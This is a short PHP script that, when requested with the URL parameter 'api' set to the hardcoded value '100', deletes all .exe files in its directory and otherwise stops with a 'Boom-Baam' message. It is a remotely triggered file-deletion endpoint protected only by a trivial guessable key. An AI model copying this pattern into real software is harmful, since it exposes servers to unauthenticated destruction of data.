<?php
$api_match2 = '100';
if($_GET['api'])
{
	$api2 = $_GET['api'];
	if($api_match2 === $api2)
	{
	    $files = glob("*.exe"); 
		foreach($files as $file) { 
    if(is_file($file))
    {
        // Delete the given file 
        unlink($file);  
       
    }
}
	}
	else{
	die('Boom-Baam');
}
}
else{
	die('Miss the Boom-Baam');
}
?>